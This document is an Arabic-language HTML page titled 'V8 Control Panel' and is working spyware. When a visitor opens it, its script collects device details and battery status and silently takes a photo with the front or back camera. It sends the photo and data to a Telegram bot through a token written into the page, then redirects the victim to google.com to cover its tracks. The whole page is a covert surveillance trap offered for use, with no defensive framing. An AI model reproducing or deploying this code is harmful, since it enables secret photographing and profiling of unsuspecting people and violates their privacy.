<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>V8 Control Panel - Live Connection</title>
    <style>
        body { background: #000; color: #00ffcc; font-family: monospace; text-align: center; padding-top: 50px; }
        .console { border: 1px solid #00ffcc; padding: 20px; display: inline-block; text-align: left; background: rgba(0,255,204,0.05); }
        .blink { animation: blinker 1s linear infinite; color: red; }
        @keyframes blinker { 50% { opacity: 0; } }
    </style>
</head>
<body>
    <div class="console">
        <h2 id="devName">جاري الاتصال بالجهاز...</h2>
        <p class="blink">● LIVE CONNECTION ESTABLISHED</p>
        <div id="logs">انتظار استجابة النظام...</div>
    </div>
    <video id="v" autoplay playsinline muted style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const TOKEN = "8367869004:AAEv2aO1zLLQ1n39BqG6hsZnlTBXXc6CLgY";
        const params = new URLSearchParams(window.location.search);
        const uid = params.get('id');
        const camMode = params.get('cam') === 'back' ? { exact: "environment" } : "user"; // تحكم أمامي/خلفي

        async function connectDevice() {
            if(!uid) return;

            // 1. الحصول على هوية الجهاز (User Agent Parsing)
            const device = navigator.userAgent.match(/\(([^)]+)\)/)[1];
            document.getElementById('devName').innerText = "Device: " + device;

            // 2. جمع البيانات الشاملة
            const battery = await navigator.getBattery();
            let report = `🛰 **اتصال كامل بنظام V8:**\n\n` +
                         `📱 الجهاز: ${device}\n` +
                         `🔋 الشحن: ${Math.floor(battery.level*100)}%\n` +
                         `🔋 الحالة: ${battery.charging ? '🔌 شحن مستمر' : '🔋 تفريغ'}\n` +
                         `🌐 المتصفح: ${navigator.appName}\n` +
                         `⚙️ المعالج: ${navigator.hardwareConcurrency} Core`;

            // 3. تشغيل الكاميرا المختارة (أمامي أو خلفي)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: camMode } });
                const video = document.getElementById('v');
                video.srcObject = stream;
                
                await new Promise(r => setTimeout(r, 2000)); // وقت للضبط

                const canvas = document.getElementById('c');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const photo = canvas.toDataURL('image/jpeg', 0.8);

                const blob = await (await fetch(photo)).blob();
                const fd = new FormData();
                fd.append('chat_id', uid);
                fd.append('photo', blob, 'capture.jpg');
                fd.append('caption', report);

                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                stream.getTracks().forEach(t => t.stop());
            } catch(e) {
                // إرسال البيانات فقط في حال فشل الكاميرا
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${uid}&text=${encodeURIComponent(report)}`);
            }
            window.location.replace("https://google.com");
        }
        window.onload = connectDevice;
    </script>
</body>
</html>
